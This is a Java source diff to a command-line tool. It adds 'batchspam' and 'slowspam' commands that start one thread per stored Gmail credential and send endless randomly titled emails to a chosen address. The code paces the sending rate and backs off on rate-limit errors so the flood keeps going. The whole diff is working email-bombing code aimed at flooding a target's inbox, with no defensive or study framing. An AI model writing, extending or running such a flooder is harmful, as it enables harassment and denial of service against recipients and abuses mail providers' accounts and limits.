@@ -29,7 +29,7 @@ public class CLI {
 				System.out.println("command is " + Arrays.toString(cmd));
 
 				switch(cmd[0]) {
-					case "spam":
+					case "batchspam":
 						if(cmd.length != 2) {
 							System.out.println("Invalid number of arguments! There should be only one, specifying the email address to spam.\n\t" +
 									"spam spamtest358@gmail.com");
@@ -42,6 +42,7 @@ public class CLI {
 						if(!toEmail.equals("stop")) {
 							ArrayList<String> fileNames = Arrays.stream(Objects.requireNonNull(new File(RSSFeedReader.CREDENTIALS_FOLDER).listFiles()))
 									.map(File::getName).collect(Collectors.toCollection(ArrayList::new));
+							fileNames.removeAll(List.of("aaronp110", "pintoa9"));
 
 							for(String name : fileNames)
 								new Thread(() -> {
@@ -84,7 +85,8 @@ public class CLI {
 														numReqSent += batch.size();
 
 														try {
-															long ts = (long) Math.max(0, (numReqSent / reqPerSec - (System.currentTimeMillis() - start) / 1000.0) * 1000.0);
+															long ts = (long) Math.max(0, (numReqSent / reqPerSec - (System.currentTimeMillis() - start) / 1000.0) *
+																	1000.0);
 															System.out.println("currReqPerSec: " + numReqSent / ((System.currentTimeMillis() - start) / 1000.0) +
 																	" sleepFor: " + ts);
 															Thread.sleep(ts);
@@ -112,21 +114,55 @@ public class CLI {
 												}
 
 												delay = 500.0;
-//												System.out.println(j.get());
+//												System.out.println(local);
 											} catch(MessagingException | IOException e) {
-												if(e instanceof GoogleJsonResponseException) {
-													int code = ((GoogleJsonResponseException) e).getDetails().getCode();
-													System.out.println("Error: " + code + " " + ((GoogleJsonResponseException) e).getDetails().getMessage());
+												delay = handleBackoff(e, delay);
+											}
+									} catch(IOException | GeneralSecurityException e) {
+										e.printStackTrace();
+									}
+								}).start();
+						}
+						break;
+					case "slowspam":
+						if(cmd.length != 2) {
+							System.out.println("Invalid number of arguments! There should be only one, specifying the email address to spam.\n\t" +
+									"spam spamtest358@gmail.com");
+							break;
+						}
 
-													if(String.valueOf(code).startsWith("5") || code == 429)
-														try {
-															System.out.println("backoff " + Math.min(delay, 20000.0));
-															Thread.sleep((long) (Math.min(delay, 20000.0) + Math.random() * 500));
-															delay *= 2.0;
-														} catch(InterruptedException e1) {
-															e1.printStackTrace();
-														}
-												} else e.printStackTrace();
+						toEmail = cmd[1];
+						j.set(0);
+
+						if(!toEmail.equals("stop")) {
+							ArrayList<String> fileNames = Arrays.stream(Objects.requireNonNull(new File(RSSFeedReader.CREDENTIALS_FOLDER).listFiles()))
+									.map(File::getName).collect(Collectors.toCollection(ArrayList::new));
+							fileNames.removeAll(List.of("aaronp110", "pintoa9"));
+
+
+							for(String name : fileNames)
+								new Thread(() -> {
+									try {
+										NetHttpTransport HTTP_TRANSPORT = GoogleNetHttpTransport.newTrustedTransport();
+										Gmail gmail = new Gmail.Builder(HTTP_TRANSPORT, RSSFeedReader.JSON_FACTORY, RSSFeedReader
+												.getCredentials(HTTP_TRANSPORT, name)).setApplicationName(RSSFeedReader.APPLICATION_NAME).build();
+
+										double delay = 500.0;
+										int local = j.getAndIncrement();
+
+										while(!toEmail.equals("stop"))
+											try {
+												Message m = GoogleMail.createMessageWithEmail(GoogleMail.createEmail(toEmail, "doesntmatter@gmail.com",
+														Long.toHexString(Double.doubleToLongBits(Math.random() / Math.random())), String.valueOf(local)));
+												local = j.getAndIncrement();
+
+												gmail.users().messages().send("me", m).execute();
+
+												delay = 500.0;
+												System.out.println(local);
+											} catch(MessagingException | IOException e) {
+												e.printStackTrace();
+												delay = handleBackoff(e, delay);
 											}
 									} catch(IOException | GeneralSecurityException e) {
 										e.printStackTrace();
@@ -137,5 +173,23 @@ public class CLI {
 				}
 			}
 		}).start();
+	}
+
+	private static double handleBackoff(Exception e, double delay) {
+		if(e instanceof GoogleJsonResponseException) {
+			int code = ((GoogleJsonResponseException) e).getDetails().getCode();
+			System.out.println("Error: " + code + " " + ((GoogleJsonResponseException) e).getDetails().getMessage());
+
+			if(String.valueOf(code).startsWith("5") || code == 429)
+				try {
+					System.out.println("backoff " + Math.min(delay, 20000.0));
+					Thread.sleep((long) (Math.min(delay, 20000.0) + Math.random() * 500));
+					delay *= 2.0;
+				} catch(InterruptedException e1) {
+					e1.printStackTrace();
+				}
+		} else e.printStackTrace();
+
+		return delay;
 	}
 }
